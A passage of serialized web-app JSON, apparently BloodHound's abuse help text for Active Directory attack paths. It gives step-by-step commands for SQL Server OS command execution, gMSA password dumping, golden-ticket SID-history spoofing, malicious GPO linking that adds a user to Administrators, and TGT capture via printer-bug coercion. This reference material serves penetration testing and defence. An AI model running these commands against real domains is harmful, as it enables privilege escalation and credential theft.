-Instance sqlserver\\instance -username myuser -password mypassword"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Python Subsystem Execution:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Invoke-SQLOSPython -Verbose -Command \"Whoami\" -Instance sqlserver\\instance"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"R subsystem Execution Example"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Invoke-SQLOSR -Verbose -Command \"Whoami\" -Instance sqlserver\\instance"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"OLE Execution Example"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Invoke-SQLOSOle -Verbose -Command \"Whoami\" -Instance sqlserver\\instance"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"CLR Execution Example"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Invoke-SQLOSCLR -Verbose -Command \"Whoami\" -Instance sqlserver\\instance"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Custom Extended Procedure Execution Example:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"1. Create a custom extended stored procedure."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Create-SQLFileXpDll -Verbose -OutFile c:\\temp\\test.dll -Command \"echo test > c:\\temp\\test.txt\" -ExportName xp_test"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"2. Host the test.dll on a share readable by the SQL Server service account."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Get-SQLQuery -Verbose -Query \"sp_addextendedproc 'xp_test', '\\\\yourserver\\yourshare\\myxp.dll'\" -Instance sqlserver\\instance"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"3. Run extended stored procedure"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Get-SQLQuery -Verbose -Query \"xp_test\" -Instance sqlserver\\instance"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"4. Remove extended stored procedure."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Get-SQLQuery -Verbose -Query \"sp_dropextendedproc 'xp_test'\" -Instance sqlserver\\instance"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Author: Scott Sutherland"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"ReadGMSAPassword","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the \"HasSession\" help modal for more details)."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash, then perform overpass-the-hash to retrieve a Kerberos ticket for the GMSA:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":"Build GMSAPasswordReader.exe from its source: https://github.com/rvazarkar/GMSAPasswordReader"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":"Drop GMSAPasswordReader.exe to disk. If using Cobalt Strike, load and run this binary using execute-assembly"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":"Use GMSAPasswordReader.exe to retrieve the NT hash for the GMSA. You may have more than one NT hash come back, one for the \"old\" password and one for the \"current\" password. It is possible that either value is valid:"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"gmsapasswordreader.exe --accountname gmsa-jkohler"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the \"HasSession\" help modal for more details)."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash.",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://github.com/micahvandeusen/gMSADumper","children":"gMSADumper.py"},"_owner":null,"_store":{}}," ","can be used for that purpose."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"gMSADumper.py -u 'user' -p 'password' -d 'domain.local'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"At this point you are ready to use the NT hash the same way you would with a regular user account. You can perform pass-the-hash, overpass-the-hash, or any other technique that takes an NT hash as an input."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"HasSIDHistory","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"No special actions are needed to abuse this, as the kerberos tickets created will have all SIDs in the object's SID history attribute added to them; however, if traversing a domain trust boundary, ensure that SID filtering is not enforced, as SID filtering will ignore any SIDs in the SID history portion of a kerberos ticket."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"By default, SID filtering is not enabled for all domain trust types."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"CrossForestTrust","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The cross-forest trust does not enable a compromise of any of the domains by default."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"BloodHound creates separate traversable edges between the domains if the configuration of the trust enables abuse."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"SameForestTrust","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker with control over any domain within the forest can escalate their privileges to compromise other domains using multiple techniques."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Spoof SID history"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker can spoof the SID history of a principal in the target domain, tricking the target domain into treating the attacker as that privileged principal."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Refer to the SpoofSIDHistory edge documentation under References for more details. The edge describes an attack over a cross-forest trust, but the principles remain the same."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["This attack fails if ",{"type":"i","key":null,"ref":null,"props":{"children":"quarantine mode"},"_owner":null,"_store":{}}," is enabled (Spoof SID History Blocked = True) on the trust relationship in the opposite direction of the attack. The SID filtering removes SIDs belonging to any other domain than the attacker-controlled domain from the authentication request. However, enabling quarantine is rare and generally not recommended for same-forest trusts."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Abuse TGT delegation"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"An attacker can coerce a privileged computer (e.g., a domain controller (DC)) in the target domain to authenticate to an attacker-controlled computer configured with unconstrained delegation. This provides the attacker with a Kerberos TGT for the coerced computer."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Refer to the AbuseTGTDelegation edge documentation under References for more details. The edge describes an attack over a cross-forest trust, but the principles remain the same."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["This attack fails if ",{"type":"i","key":null,"ref":null,"props":{"children":"quarantine mode"},"_owner":null,"_store":{}}," is enabled on the trust relationship in the opposite direction of the attack. This prevents TGTs from being sent across the trust. However, enabling quarantine is rare and generally not recommended for same-forest trusts."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"ADCS ESC5"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The Configuration Naming Context (NC) is a forest-wide partition writable by any DC within the forest. Most Active Directory Certificate Services (ADCS) configurations are stored in the Configuration NC. An attacker can abuse a DC to modify ADCS configurations to enable an ADCS domain escalation opportunity that compromises the entire forest."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["Attack steps:",{"type":"ol","key":null,"ref":null,"props":{"style":{"listStyleType":"decimal","paddingLeft":"1.5em"},"children":[{"type":"li","key":null,"ref":null,"props":{"children":"Obtain a SYSTEM session on a DC in the attacker-controlled domain"},"_owner":null,"_store":{}},{"type":"li","key":null,"ref":null,"props":{"children":"Create a certificate template allowing ESC1 abuse"},"_owner":null,"_store":{}},{"type":"li","key":null,"ref":null,"props":{"children":"Publish the certificate template to an enterprise CA"},"_owner":null,"_store":{}},{"type":"li","key":null,"ref":null,"props":{"children":"Enroll the certificate as a privileged user in the target domain"},"_owner":null,"_store":{}},{"type":"li","key":null,"ref":null,"props":{"children":"Authenticate as the privileged user in the target domain using the certificate"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Refer to \"From DA to EA with ESC5\" under References for more details."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If ADCS is not installed: An attacker can simply install ADCS in the environment and exploit it, as detailed in the reference \"Escalating from child domain’s admins to enterprise admins in 5 minutes by abusing AD CS, a follow up\"."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"GPO linked on Site"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"AD sites are stored in the forest-wide Configuration NC partition, writable by any DC within the forest. An attacker with SYSTEM access to a DC can link a malicious GPO to the site of any DC in the forest."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 1: Obtain a SYSTEM session on a DC in the attacker-controlled domain"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Use PsExec to start a PowerShell terminal as SYSTEM on the DC:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"PsExec64.exe -s -i -accepteula powershell"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 2: Create a GPO"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Use the GroupPolicy module of RSAT to create the new GPO:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-GPO -Name \"MyGPO\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 3: Add the compromising setting to the GPO"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Use SharpGPOAbuse to add a scheduled task that adds a compromised user to the Administrators group:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":".\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"MyTask\" --Author \"NT AUTHORITY\\SYSTEM\" --Command \"cmd.exe\" --Arguments \"/c net localgroup Administrators /Add DUMPSTER\\tim\" --GPOName \"MyGPO\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 4: Identify a target DC and it's site"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Use the ActiveDirectory module of RSAT to query for DCs in the target domain:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Get-ADDomainController -server bastion.local | select Name,Site"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Look up the site DistinguishedName:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Get-ADReplicationSite Default-First-Site-Name | select DistinguishedName"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 5: Set the GPO permissions"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"This step is important to avoid applying the GPO to all computers connected to the site. Use the GroupPolicy module of RSAT to modify the permissions such that Authenticated Users can read the object but only the targeted computer applies the GPO settings:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$GPO = Get-GPO -Name \"MyGPO\"\n$GPO | Set-GPPermissions -PermissionLevel GpoRead -TargetName \"Authenticated Users\" -TargetType Group -Replace\n$GPO | Set-GPPermissions -PermissionLevel GpoApply -TargetName \"BASTION\\bldc01\" -TargetType Computer"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":"b","key":null,"ref":null,"props":{"children":"Step 6: Link the GPO to the site"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Use the GroupPolicy module of RSAT to link the GPO to the site:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-GPLink -Name \"MyGPO\" -Target \"CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=bastion,DC=local\" -Server dc01.dumpster.fire"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Note that you must specify the server to be the DC where you are running the command, as the command defaults to execute the change on a root domain DC where the compromised DC does not have the permissions to link the GPO."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Wait until replication has happened and the GPO has applied on the target DC, and log in with Administrators access on the compromised DC. Replication within the same site happens within 15 seconds but runs on 3 hour schedule by default across sites. GPOs are applied on a 90-120 min interval by default."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"SpoofSIDHistory","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"When spoofing SID history over a same-forest trust, any domain SID from the target domain can be used. The most common choice is the Enterprise Admins SID, as it grants full control over the target domain."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["Spoofing SID history over a cross-forest trust is more restricted. In this scenario, SID filtering removes SIDs with a RID below 1000, meaning built-in AD groups like Domain Admins and Enterprise Admins cannot be used. Additionally, group memberships for global and universal groups are not applied based on SID history, making accounts in groups like Domain Admins and Enterprise Admins ineffective as targets.",{"type":"p","key":null,"ref":null,"props":{"className":"my-4","children":"The attack target must be a user, computer, or a non-builtin group with permissions granted directly or through built-in/domain local groups (NOT through membership of global/universal groups)."},"_owner":null,"_store":{}},"Common viable targets with indirect full control over the environment include:",{"type":"ul","key":null,"ref":null,"props":{"children":[{"type":"li","key":null,"ref":null,"props":{"children":"The Exchange Windows Permissions group"},"_owner":null,"_store":{}},{"type":"li","key":null,"ref":null,"props":{"children":"Entra ID sync (MSOL_) accounts"},"_owner":null,"_store":{}},{"type":"li","key":null,"ref":null,"props":{"children":"Custom groups with administrative control over Tier Zero assets"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},"Alternatively, an attacker can target a domain controller (DC) and use resource-based constrained delegation (RBCD) to obtain a local TGT as the DC, which can then be used for a DCSync attack on the target domain. However, the RBCD attack requires control over an account (user or computer) in the target forest. If no such account is available and the default permissions for creating computers have not been restricted, the attacker can first spoof SID history against a target with permissions to create computer accounts, to then perform the RBCD attack against a DC."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["The spoofed SID can be added to SID history at three different levels for the attacker-controlled user of the trusted domain:",{"type":"ol","key":null,"ref":null,"props":{"style":{"listStyleType":"decimal","paddingLeft":"1.5em"},"children":[{"type":"li","key":null,"ref":null,"props":{"children":"In the user's SID History AD attribute"},"_owner":null,"_store":{}},{"type":"li","key":null,"ref":null,"props":{"children":"In the user's Kerberos TGT"},"_owner":null,"_store":{}},{"type":"li","key":null,"ref":null,"props":{"children":"In the user's Kerberos inter-realm TGT"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":"p","key":null,"ref":null,"props":{"className":"my-4","children":["The first option enables the attack over both Kerberos and NTLM, whereas the latter two only apply to Kerberos authentication. However, modifying the SID History attribute is risky—it cannot be edited directly via LDAP or built-in AD tools. Mimikatz supports modifying it with the command"," ",{"type":"code","key":null,"ref":null,"props":{"children":"sid::patch"},"_owner":null,"_store":{}}," followed by ",{"type":"code","key":null,"ref":null,"props":{"children":"sid::add"},"_owner":null,"_store":{}},", but ",{"type":"code","key":null,"ref":null,"props":{"children":"sid::patch"},"_owner":null,"_store":{}}," does not work on Windows Server 2016 and later. It is possible to modify the SID History attribute using the DSInternals command ",{"type":"code","key":null,"ref":null,"props":{"children":"Add-ADDBSidHistory"},"_owner":null,"_store":{}},", but this requires stopping and restarting the NTDS service, which is not recommended in a production environment."]},"_owner":null,"_store":{}},"The second and third options are safer. The following example demonstrates the second option."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Step 1) Obtain krbtgt Credentials"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The krbtgt credentials can be obtained in multiple ways with administrative access to a DC in the trusted domain, such as via a DCSync attack."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Step 2) Forge and Inject a Golden Ticket"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Generate a Golden Ticket (Kerberos TGT) in the trusted domain with the target's SID added in SID history. Alternatively, a Diamond Ticket can be created for better OPSEC."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"On Windows, use Rubeus:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Rubeus.exe golden /aes256:<krbtgt AES256 secret key> /user:<trusted domain user SAMAccountName> /id:<trusted domain user RID> /domain:<trusted domain DNSname> /sid:<trusted domain SID> /sids:<target SID> /dc:<trusted domain DC DNSname> /nowrap /ptt"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This command injects the ticket into memory, allowing access to the target domain with the permissions of the target."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"On Linux, use ticketer.py from Impacket:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"ticketer.py -nthash <krbtgt NT hash> -aesKey <krbtgt AES256 secret key> -domain-sid <trusted domain SID> -domain <trusted domain DNSname> -extra-sid <target SID> <trusted domain user SAMAccountName>"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["The ticketer.py command saves the Golden Ticket as a ",{"type":"code","key":null,"ref":null,"props":{"children":".ccache"},"_owner":null,"_store":{}}," file. To use it with tools supporting Kerberos authentication, set the ",{"type":"code","key":null,"ref":null,"props":{"children":"KRB5CCNAME"},"_owner":null,"_store":{}}," environment variable:"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"export KRB5CCNAME=$path_to_ticket.ccache"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AbuseTGTDelegation","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"TGT delegation allows an attacker to capture TGTs of privileged users or computers in the target domain when they authenticate against a system configured with unconstrained delegation."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"A common attack method involves the attacker logging into a DC of the source domain and coercing a DC of the target domain. Since DCs have unconstrained delegation enabled by default, this grants the attacker a TGT for a target domain DC, which can then be used to perform a DCSync attack on the target domain. This guide details that version of the attack."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Alternatively, attackers can target other privileged computers or users besides DCs."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The attack will fail if the target is a member of Protected Users or is marked as not trusted for delegation, as their TGTs will not be sent to hosts with unconstrained delegation. You can identify all protected principals using the following Cypher query in BloodHound:"},"_owner":null,"_store":{}},{"key":null,"ref":null,"props":{"children":"MATCH (g:Group)\n    WHERE g.objectid ENDS WITH \"-525\"\n    MATCH (n:Base)\n    WHERE n.sensitive = TRUE OR (n)-[:MemberOf*..]->(g)\n    RETURN n\n    LIMIT 1000"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Attackers can also exploit non-DC hosts or users in the source domain with unconstrained delegation enabled. To find all non-DC principals with unconstrained delegation in BloodHound, run:"},"_owner":null,"_store":{}},{"key":null,"ref":null,"props":{"children":"MATCH (n:Base)\n    WHERE n.unconstraineddelegation = TRUE AND NOT (n)-[:DCFor]->()\n    RETURN n"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Step 1: Start Monitoring for TGTs"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":{"type":"b","key":null,"ref":null,"props":{"children":"Windows:"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Log into a DC of the source domain and open a command prompt as Administrator."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Start monitoring for incoming TGTs using Rubeus:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Rubeus.exe request monitor /user:targetdc.domain.local /interval:5 /nowrap"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":{"type":"b","key":null,"ref":null,"props":{"children":"Linux:"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Obtain credentials for a computer or user with unconstrained delegation."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Start monitoring for incoming TGTs using krbrelayx.py with the credentials of the unconstrained delegation account:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"krbrelayx.py -aesKey 9ff86898afa70f5f7b9f2bf16320cb38edb2639409e1bc441ac417fac1fed5ab"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Step 2: Coerce the Target DC"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The printer bug is abused in this example. If the Print Spooler service is disabled on the target host, alternative coercion techniques must be used. See \"Windows Coerced Authentication Methods\" under References for details."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"To coerce the target DC, Authenticated Users access is required in the target domain. If the trust relationship is bidirectional, all principals in the source domain have this access by default. If not, coercion must be executed as a principal from the target forest. Attackers can obtain such a session using the trust account attack. See \"SID Filter as a Security Boundary Between Domains? (Part 7) - Trust Account Attack\" under References for details."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":{"type":"b","key":null,"ref":null,"props":{"children":"Windows:"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"From any host in the domain, coerce the target DC using SpoolSample:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"SpoolSample.exe targetdc.domain.local compromiseddc.otherdomain.local"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Rubeus will print the DC TGT as soon as it is received."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":{"type":"b","key":null,"ref":null,"props":{"children":"Linux:"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Coerce the target DC using printerbug.py:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"printerbug.py '<domain>/<username>:<password>'@<target DC IP> <compromised DC IP>"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"krbrelayx.py will save the received TGT to disk."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Step 3: Pass the Ticket"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":{"type":"b","key":null,"ref":null,"props":{"children":"Windows:"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Inject the DC TGT into memory using Rubeus:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Rubeus.exe ptt 